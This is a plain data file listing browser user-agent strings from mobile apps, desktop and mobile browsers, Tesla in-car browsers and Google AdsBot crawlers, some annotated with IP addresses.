"Mozilla/5.0 (Linux; Android 14; V2205 Build/UP1A.231005.007_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 6 Pro Build/UQ1A.240205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S711U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; V2248 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SM-G981U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; 2206123SC Build/UKQ1.231003.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S908U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S911U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.9 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-A042M Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; M2012K11G Build/UKQ1.231207.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 6a Build/AP1A.240305.019.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; NE2213 Build/SKQ1.220617.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (iPad; CPU OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H386 Twitter for iPhone/10.31.1"
"Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22A5346a Twitter for iPhone/10.55"
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J727U Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SO-53B Build/61.2.C.0.212; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; 23013RK75C Build/UKQ1.230804.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-F946U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Android 15; Mobile; rv:68.0) Gecko/68.0 Firefox/130.0"
"Mozilla/5.0 (Android 15; Mobile; LG-M255; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Vivaldi/6.9.3447.48"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Linux; arm_64; Android 15; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 YaBrowser/24.7.9.61 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.3"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0."
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0."
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0."
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.3"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck"
"Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Config/91.2.1916.1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128."
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.14.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.302 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.3"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Android 13; Mobile; rv:130.0) Gecko/130.0 Firefox/130."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/334.0.674067880 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/334.0.674067880 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Linux; Android 9; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/128.0.2739.90"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edge/44.18363.8131"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/128.0.2739.90"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (X11; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/128.2739.82 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPod; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPod touch; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"
"Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Linux; Android 14; 2312DRA50G Build/UKQ1.231003.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.5-41d94f79b976"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.2-108daa2c1277"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.11-ccacdb181f16"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.36.2.2-186de86"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.36.2.4-fc422c3"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.8-9744d0c0d399"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.40.2-36f8355b356a"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.40.50.5-79b51bc76a61"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 [ip:78.211.152.230]"
"Mozilla/5.0 (Linux; Android 4.4.2; SM-C101 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Mobile Safari/537.36 OPR/16.0.1212.65583"
"Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36 Instagram 350.1.0.46.93 Android (31/12; 450dpi; 1080x2208; samsung; SM-A137F; a13ve; mt6768; it_IT; 645441432)"
"Mozilla/5.0 (Linux; Android 10; LM-X525 Build/QKQ1.200531.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36 Instagram 350.1.0.46.93 Android (29/10; 280dpi; 720x1382; LGE/lge; LM-X525; mmh4p; mmh4p; pt_BR; 645441619)"
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 4.4.2; SM-C101 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.141 Mobile Safari/537.36 OPR/45.1.2246.125351"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML%2C like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:45.125.216.44]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html), XFF:72.14.199.154"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML,\x5CxC2\x5CxA0like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.143.216.33]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:72.14.199.122]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html), XFF:72.14.199.158"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML,\xC2\xA0like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.92.128]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.92.130]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.87.156]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.87.152]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.89.90]"
